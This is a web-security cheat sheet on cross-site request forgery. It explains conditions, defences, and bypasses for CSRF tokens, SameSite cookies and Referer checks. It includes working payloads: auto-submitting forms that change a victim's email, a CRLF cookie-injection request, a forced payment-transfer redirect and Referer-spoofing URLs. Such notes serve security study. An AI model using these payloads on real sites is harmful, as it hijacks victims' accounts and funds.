# CSRF

<details>

<summary>Impact</summary>

* The attacker causes the victim user to carry out an action unintentionally
  * Change password, email, make a funds transfer

<!---->

* If the victim is a privileged user the attacker might be able to take full control of all the application's

</details>

## Conditions

* A relevant action
  * Example: change password
* Cookie-based session handling
* No unpredictable request parameters:
  * If you need to know the value of the existing password -> no vulnerable

## **Exploit**

1. with POST

```html
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

2. with GET

```html
<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
```

## Defences

<details>

<summary>CSRF tokens</summary>

A CSRF token is a unique, secret, and unpredictable value that is generated by the server-side application and shared with the client

```html
<form name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="example@normal-website.com">
    <input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
    <button class='button' type='submit'> Update email </button>
</form>
```

</details>

<details>

<summary>SameSite cookies</summary>

Controls whether or not a cookie is sent with cross-site requests

If the website doesn't explicitly set a `SameSite` attribute, Chrome automatically applies `Lax` restrictions by default.

* `Strict`: Means that the browser sends the cookie only for same-site requests

<!---->

*   `Lax`: Means that browser sends the cookie in cross-site requests, if:

    * The request uses the `GET` method.
    * The request resulted from a top-level navigation by the user, such as clicking on a link.

    The cookie is not sent on cross-site requests, such as on requests to load images or frames.
* `None`: Means that the browser sends the cookie with both cross-site and same-site requests. The `Secure` attribute must also be set when setting this value, like so `SameSite=None; Secure`

</details>

<details>

<summary>Referer-based validation</summary>

Some applications make use of the HTTP Referer header to attempt to defend against CSRF attacks, normally by verifying that the request originated from the application's own domain

</details>

## CSRF tokens bypass

* **Switch from POST to the GET method to bypass**
* **Remove the entire parameter containing the token**
* Sometimes you don't need a valid token (the app doesn't keep valid server-side tokens) .
  * Simply **invent a token in the required format**
* Some apps don't validate if the token belongs to the same session as the requesting user.
  * Log in to the application with your account, **obtain a valid token**, and then **feed that token to the victim user** in their CSRF attack
* Some applications do tie the CSRF token to a cookie, but not to the session cookie. So there are two token: one in a cookie and one in hidden input. (this can also have the same value)
  * Can you set a cookie? Ex. Header injection with `CRLF`.&#x20;
  * ```
    /?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
    ```
  * Log in to the application with your account -> obtain a valid token and associated cookie.
  * Remove the auto-submit `<script>` block, and add the following code to inject the cookie.
  * ```html
    <img src="https://vulnerable-website.com/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
    ```



## SameSite cookies bypass

* Bypassing SameSite Lax restrictions using GET requests
  * ```html
    <script>
        document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
    </script>
    ```
  * Even if an ordinary `GET` request isn't allowed, some frameworks provide ways of overriding the method specified in the request line. Example some framework supports `_method` parameter. Other frameworks support a variety of similar parameters.
  * ```http
    GET /my-account/change-email?email=a@a.com&_method=POST HTTP/1.1
    ```
* Bypassing SameSite Strict bypass via client-side redirect
  * Consider a page `https://vulnerable-website.com/post/confirm?postId=10` that load this script.
  * ```javascript
    redirectOnConfirmation = () => {
        setTimeout(() => {
            const url = new URL(window.location);
            const postId = url.searchParams.get("postId");
            window.location = '/post/' + postId;
        }, 3000);
    }
    ```
  * ```html
    <script>
        document.location = "https://vulnerable-website.com/post/confirm?postId=10/../../my-account/change-email?email=a@a.com";
    </script>
    ```
  * Note: this attack isn't possible with server-side redirects, as browsers recognize the cross-site request and apply cookie restrictions.

## Referer-based validation bypass

* Validation of Referer depends on header being present
  * Some apps validate the Referer header if present, but skip if omitted
  * `<meta name="referrer" content="never">`
* Validation of Referer can be circumvented
  * `http://vulnerable-website.com.attacker-website.com/csrf-attack`
  * `http://attacker-website.com/csrf-attack?vulnerable-website.com`
  * `http://attacker-website.com/vulnerable-website.com`
  * Note 1: add Referrer-Policy: unsafe-url
    * One way to set it in html: `<meta name="referrer" content="unsafe-url" />`
  * Note 2: Firefox 87 new default Referrer Policy ‘strict-origin-when-cross-origin’ trimming user sensitive information like path and query string to protect privacy. (https://blog.mozilla.org/security/2021/03/22/firefox-87-trims-http-referrers-by-default-to-protect-user-privacy/)
  * Note 3: Instead of use http://attacker-website.com/vulnerable-website.com that looks strange you can use http://attacker-website.com/ and add `<script>history.pushState('', '', '/attacker-website.com')</script>`

More info about setting Referer-Policy: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy
